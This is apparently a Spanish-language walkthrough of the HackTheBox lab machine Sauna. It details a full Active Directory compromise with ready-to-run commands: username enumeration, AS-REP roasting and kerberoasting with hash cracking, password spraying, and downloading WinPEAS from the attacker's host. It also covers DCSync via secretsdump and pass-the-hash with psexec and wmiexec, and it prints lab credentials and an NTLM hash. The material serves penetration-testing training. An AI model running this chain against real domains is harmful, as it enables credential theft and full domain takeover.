![saunainfo](https://github.com/user-attachments/assets/c90f3529-8a38-4509-bbc1-0929258e4c8c)

Como de costumbre, comenzamos realizando un escaneo de puertos abiertos de la máquina objetivo.

``sudo nmap 10.10.10.175 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250314094245](https://github.com/user-attachments/assets/add8b800-ed05-4aed-9af6-1c52207f84b8)


Una vez conocemos los puertos abiertos podemos intuir que estamos ante un DC. No obstante, queremos conocer con exactitud qué servicios y versiones están corriendo en dichos puertos, por lo que lanzamos otro escaneo sobre estos puertos:

``nmap 10.10.10.175 -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49698 -oN target``

![Pasted image 20250314094738](https://github.com/user-attachments/assets/b671b154-1b5d-4940-924d-17fb8906877b)

En este output ya empezamos a tener información de utilidad. Vamos a utilizar netexec para confirmar el dominio y conocer el nombre de la máquina.

``netexec smb 10.10.10.175``

![Pasted image 20250314094329](https://github.com/user-attachments/assets/97d6e43c-cb70-456a-91a6-6fe3b75598a5)

La máquina se llama Sauna y el Dominio EGOTISTICAL-BANK, por lo que podemos añadirlo al /etc/hosts.

![Pasted image 20250314100328](https://github.com/user-attachments/assets/48ce959a-1453-4480-b1e7-9cb4ec7e8c83)


Vamos a comenzar echando un vistazo a la página web:

![Pasted image 20250314094935](https://github.com/user-attachments/assets/202caaf9-d467-4b69-954c-8743389fcc4b)


Si scrolleamos en el index, vemos:

![Pasted image 20250314095122](https://github.com/user-attachments/assets/abcbc7b2-d68f-42ae-9099-79eda41e597e)


Pero si vamos echamos un vistazo a /about.html:

![Pasted image 20250314095049](https://github.com/user-attachments/assets/c993750d-caae-4636-b4c2-a5f44478c942)

Es una referencia directa a nombres de usuario que parecen formar parte del equipo.

Tenemos un listado potencial de usuarios, por lo que nos los guardamos en users.txt.

![Pasted image 20250314095218](https://github.com/user-attachments/assets/f13f6242-8499-4e76-9202-f3f66f167b07)


Una vez tenemos este listado de posibles usuarios, nos falta conocer qué estructura tienen a nivel de dominio para identificar/crear a los usuarios. Una herramienta muy buena para estos casos es anarchyusers. 

https://github.com/urbanadventurer/username-anarchy

Esta herramienta nos permite hacer múltiples combinaciones. Si ejecutamos ``username-anarchy -l`` podemos visualizar (y con ejemplos) dichas combinaciones:

![Pasted image 20250314095659](https://github.com/user-attachments/assets/e5baa415-ae6b-487e-a2c1-7f082d939d9c)


Le pasamos la lista de usuarios y las combinaciones a realizar:

``./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchyusers.txt``

Esto nos genera un archivo de 88 líneas que son producto de las combinaciones entre nombre y apellido que nos ofrece (partiendo de 6 usuarios). Para que se entienda con un ejemplo, las combinaciones que nos ha realizado para el usuario "fergus smith", son:

![Pasted image 20250314100128](https://github.com/user-attachments/assets/5d2f6b0c-453e-47e5-b6e2-71786501ea53)

Una vez tenemos las combinaciones en un listado más extenso (anarchyusers.txt), se lo pasamos a kerbrute con el parámetro userenum para que valide si son usuarios reales (o no) y qué estructura/combinación se utiliza a nivel de dominio para generar usuarios.

``kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL anarchyusers.txt``

![Pasted image 20250314100431](https://github.com/user-attachments/assets/b7494863-6709-4ede-a8b0-50629b7a3f3a)

Kerbrute nos devuelve que fsmith es un usuario válido. No sólo hemos sacado un usuario válido, sino que ahora también conocemos ahora la forma que tiene el DC de generar usuarios: inicial del nombre+apellido.

Aunque no conozcamos la contraseña del usuario fsmith, podemos averiguar, gracias a la técnica asreproasting, si dicho usuario no requiere autenticación previa de kerberos (DontRequirePreAuth), lo que nos proporcionaría un hash que, si conseguimos romper, nos dará la contraseña en texto claro del usuario en cuestión. 

Dado que sólo tenemos un usuario válido, modificamos nuestro users.txt previo y lo dejamos así:

![Pasted image 20250314100507](https://github.com/user-attachments/assets/69c747c1-47d4-4957-a6ea-7f4df5f4a4b9)


``impacket-GetNPUsers -no-pass -usersfile users.txt EGOTISTICAL-BANK.LOCAL/ -output hashes.asreproast ``

![Pasted image 20250314100630](https://github.com/user-attachments/assets/dc46025e-c2e3-49d7-a358-ceede33e6bc8)


Bingo. Tenemos el hash del usuario fsmith y nos lo hemos guardado en hashes.asreproast. Ahora, para intentar romperlo, se lo pasamos a hashcat.

Antes de ello, vamos a averiguar el código interno que tiene hashcat para identificar este tipo de hashes (``krb5asrep$23$``), para ello:

``hashcat --help | grep -i "kerberos"``

![Pasted image 20250314100744](https://github.com/user-attachments/assets/51653e26-8c0e-415a-9c7c-e932f6d407da)


Una vez sabemos el código interno de hashcat, 18200, lo lanzamos con rockyou como diccionario.

``hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force``

![Pasted image 20250314100911](https://github.com/user-attachments/assets/bda69a50-ae81-4ae3-b63d-89e373f532f4)

Tenemos credenciales válidas para el dominio -> fsmith:Thestrokes23

Aunque todo apunta a ello, vamos a  validarlas con netexec:

``netexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'``

![Pasted image 20250314102630](https://github.com/user-attachments/assets/8f1833d8-efe0-4852-b728-ed5d10d3e77c)

En el output podemos ver [+], por lo que nos confirma que son credenciales válidas.

La pregunta ahora es: Vale, tengo credenciales válidas, pero, ¿puedo conectarme con dichas credenciales? ¿Forma parte del grupo Remote Management Users el usuario que tenemos? Pues vamos a comprobarlo.

``netexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'``

![Pasted image 20250314102738](https://github.com/user-attachments/assets/66a05405-ccef-49e2-88b5-a58554cdf2f6)

Pwn3d! Genial, podemos conectarnos por winRM.

Antes de conectarnos con evil-winrm podemos seguir enumerando. Por ejemplo, si nos conectamos a través de RPC podemos listar usuarios (aunque también podríamos listarlos desde dentro si nos conectamos con evil-winrm):

``rpcclient -U 'fsmith%Thestrokes23' 10.10.10.175 -c enumdomusers > rpcusers.txt``

![Pasted image 20250314101843](https://github.com/user-attachments/assets/0ea9487c-b71a-4d6c-bb92-d4ea05034317)

Tenemos usuarios del dominio, pero si quisiéramos tener un diccionario de usuarios válidos, primero tenemos que hacer un tratamiento a dichos datos. Nos quedaremos sólo con lo que está entre los primeros corchetes.

``cat rpcusers.txt | cut -d '[' -f2 | cut -d ']' -f1 > realusers.txt``

![Pasted image 20250314102515](https://github.com/user-attachments/assets/63f1a9d8-5c00-4eea-a04d-34a755346c55)

Nos conectamos por winRM como el usuario fsmith.

``evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'``

![Pasted image 20250314102944](https://github.com/user-attachments/assets/9403b1d6-ee09-4ed8-9bae-41c227057bf9)

Estamos dentro de la máquina víctima.

Recogemos la flag de usuario en C:\Users\FSmith\Desktop\user.txt

![Pasted image 20250314103151](https://github.com/user-attachments/assets/3cb1a149-e1e3-4b0c-b8f7-735806361357)

# Privesc

Tenemos un listado de usuarios del dominio y unas credenciales válidas, por lo que vamos a probar kerberoasting.

``impacket-GetUserSPNs -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith``

![Pasted image 20250314103332](https://github.com/user-attachments/assets/eb2990b1-c307-425e-914a-8b04fdb86149)

Parece que sí hay un usuario del que podremos sacar su hash (HSmith), pero ahora no podemos por el error que nos arroja: Clock skew too great. Esto significa que hay demasiada desincronización con el reloj del DC.

Para sincronizarlo, simplemente:

sudo ntpdate IPdelDC

``sudo ntpdate 10.10.10.175``

![Pasted image 20250314104113](https://github.com/user-attachments/assets/3241c2f2-84e2-4655-a005-e168f83dda72)


Repetimos.

``impacket-GetUserSPNs -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith``

![Pasted image 20250314104146](https://github.com/user-attachments/assets/52bfb799-959a-412c-9269-f041fa067ff7)

Ahora sí. Tenemos el hash de HSmith. O bien nos copiamos su contenido, o bien repetimos el comando redirigiendo el output a un archivo.

![Pasted image 20250314104422](https://github.com/user-attachments/assets/8b650177-ad0c-4d71-a972-cae22c7b3840)


Una vez lo tenemos, comprobamos a qué código interno pertenece en hashcat este tipo de hash (``krb5tgs$23$``)

``hashcat --help | grep -i "kerberos"``

![Pasted image 20250314104557](https://github.com/user-attachments/assets/c1490aba-d228-429b-84b2-47de0b5f3937)


Ahora que conocemos el código interno de hashcat, se lo pasamos junto con rockyou como diccionario.

``hashcat -m 13100 hsmithtgs /usr/share/wordlists/rockyou.txt --force``

![Pasted image 20250314105451](https://github.com/user-attachments/assets/214d915d-2faf-4587-8054-642ae5ec9345)

Anda, curiosamente es la misma contraeña que para Fsmith. Esto quiere decir que si hubiesemos hecho password spraying contra los usuarios del dominio, también podríamos haberla sacado:

``netexec smb 10.10.10.175 -u realusers.txt -p 'Thestrokes23' --continue-on-sucess``

![Pasted image 20250314105544](https://github.com/user-attachments/assets/be6a09e3-9735-468b-83e4-1cbd984dbc99)

Efectivamente, podríamos haberla sacado si hubiéramos hecho password spraying. A su vez, hemos validado las nuevas credenciales -> hsmith:Thestrokes23

Vamos a comprobar si este nuevo usuario forma parte de Remote Management Users para poder conectarnos con evil-winrm.

``netexec winrm 10.10.10.175 -u 'hsmith' -p 'Thestrokes23'``

![Pasted image 20250314105820](https://github.com/user-attachments/assets/354ab3fa-0564-428d-8de1-713c990dd931)


Pero no, tenemos [-] en el output de netexec.. Esto quiere decir que no podemos conectarnos a través de winRM con este usuario. No obstante, podríamos intentar otras formas de pivotar desde el usuario fsmith a hsmith.

Sin embargo, antes de seguir con este vector, vamos a explorar más a fondo la máquina víctima.

Vamos a compartir la herramienta WinPEAS con la máquina víctima. Podemos hacerlo de diferentes maneras. En esta ocasión, vamos a hacerlo a través de servidor http montado con python.

- Primero creamos carpeta temporal en máquina víctima:

``mkdir C:\temp``

![Pasted image 20250314110043](https://github.com/user-attachments/assets/9dc4dc5f-6dc5-45a2-9263-3b46662f5956)

Una vez creada la carpeta nos movemos a ella.

- Después, desde la máquina atacante, levantamos un servidor http en el directorio que tengamos winPEAS.

``python3 -m http.server 80``

- Acto seguido, desde la máquina víctima, realizamos la solicitud del recurso winPEASx64.exe, apuntando a nuestro servidor http, es decir, nuestra máquina atacante.

``iwr http://10.10.14.8/winPEASx64.exe -o winpeas.exe``

![Pasted image 20250314133433](https://github.com/user-attachments/assets/0a0f925b-fbbb-4a45-ba96-a0d53b8f620e)

Una vez hemos compartido la herramienta, la ejecutamos:

``.\winpeas.exe``

Si echamos un vistazo a su output encontramos credenciales de AutoLogon:

![Pasted image 20250314133611](https://github.com/user-attachments/assets/ee9fc97f-c9ff-41f7-80f5-69ecf65c269b)

svc_loangmanager : Moneymakesthworldgoround!

No obstante, dada la enumeración previa que hicimos de usuarios a través de RPC, sabemos que el usuario al que probablemente está haciendo referencia es "svc_loanmgr", el cual también aparece, más abajo, en el output de winpeas:

![Pasted image 20250314133720](https://github.com/user-attachments/assets/11c1c68f-33b6-4c37-a9e0-5c820f2964c2)

Teniendo estas posibles credenciales, las validamos con netexec.

``netexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'``

![Pasted image 20250314133847](https://github.com/user-attachments/assets/cde6bdaf-5148-4271-8626-e98de4e8c2d2)

Son credenciales válidas.
¿Formará parte el usuario svc_loanmgr del grupo Remote Management Users? Esto nos permitiría conectarnos con evil-winrm. Vamos a comprobarlo.

``netexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'``

![Pasted image 20250314134001](https://github.com/user-attachments/assets/5967c1b7-0fa3-4478-baf9-64877326abc8)

Nos pone pwn3d!, por lo que sí podemos conectarnos.

``evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'``


![Pasted image 20250314134118](https://github.com/user-attachments/assets/305a78c7-6322-40a7-ad25-ab7173bba3f4)

Si realizamos una enumeración desde dentro no vemos nada interesante, por lo que vamos a tirar de BloodHound. Como el DC tiene un servicio DNS corriendo no es necesario que compartamos sharphound para enumerar.

``bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -c all -ns 10.10.10.175``
![Pasted image 20250314135558](https://github.com/user-attachments/assets/693466ef-43c8-44ec-b96f-b1c0f890dff0)

Una vez tenemos la data en la máquina atacante:

- Levantamos neo4j

``sudo neo4j start``

- Levantamos BloodHound:

``bloodhound --no-sandbox &>/dev/null & disown``

- Introducimos nuestras credenciales de neo4j.

- Importamos desde la interfaz gráfica de BloodHound los .json previamente recolectados:

![Pasted image 20250313132148](https://github.com/user-attachments/assets/e3305504-d94c-4899-8f8d-62a1921fb4ab)


![Pasted image 20250314135846](https://github.com/user-attachments/assets/30472b52-8b2c-4e30-9186-5a76df398825)


Una vez se ha subido  toda la data, buscamos a los usuario que tenemos pwneados en el buscador y los marcamos como owned:

![Pasted image 20250314140008](https://github.com/user-attachments/assets/cf19d585-1908-4b54-a8fa-badf4d6d735c)


![Pasted image 20250314135948](https://github.com/user-attachments/assets/ce558cd7-a14d-454f-a804-ed52a98b957d)


Repetimos proceso para HSmith y svc_loanmgr.

Si exploramos un poco a través de BloodHound vemos algo interesante.

Si vemos la información del nodo de svc_loanmgr (node info) y vamos al apartado "First Degree Object Control", vemos:

![Pasted image 20250314140241](https://github.com/user-attachments/assets/faaff750-27ca-4961-ad96-112748c3ea15)


El usuario svc_loanmgr tiene permisos de DCSync. Es decir, que puede volcar todos los hashes NTLM de los usuarios del dominio.

Si hacemos click derecho -> Help, veremos más información al respecto:

![Pasted image 20250314140325](https://github.com/user-attachments/assets/b3562058-277e-408d-967d-537abcee0116)


Para explotar este ataque lo hacemos con impacket-secretsdump.

``impacket-secretsdump EGOTISTICAL-BANK.LOCAL/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'``

![Pasted image 20250314140517](https://github.com/user-attachments/assets/d5e808f6-4964-431f-9c9e-e34d65f7fdf4)

Vemos el hash NTLM de Administrator. Vamos a validarlo.

``netexec smb 10.10.10.175 -u 'Administrator' -H ':823452073d75b9d1cf70ebdf86c7f98e'``

![Pasted image 20250314140622](https://github.com/user-attachments/assets/8f5ecfd0-ebb4-439b-b4ba-66fc544392d3)


Bingo. Tenemos pwn3d, por lo que podemos conectarnos como NtAuthority\System (psexec) o como administrator (wmiexec).

``impacket-psexec Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'``

![Pasted image 20250314140841](https://github.com/user-attachments/assets/99d176f9-d18c-4574-992b-3a693255841f)


``impacket-wmiexec Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'``

![Pasted image 20250314140901](https://github.com/user-attachments/assets/15c725bb-87dd-4b6d-b14c-ad0202a42be7)

De cualquiera de las dos formas, podemos acceder a C:\Users\Administrator\Desktop\root.txt y coger la flag de Administrador.

![Pasted image 20250314141011](https://github.com/user-attachments/assets/c213dc5f-c220-4466-b757-230acfb0275d)
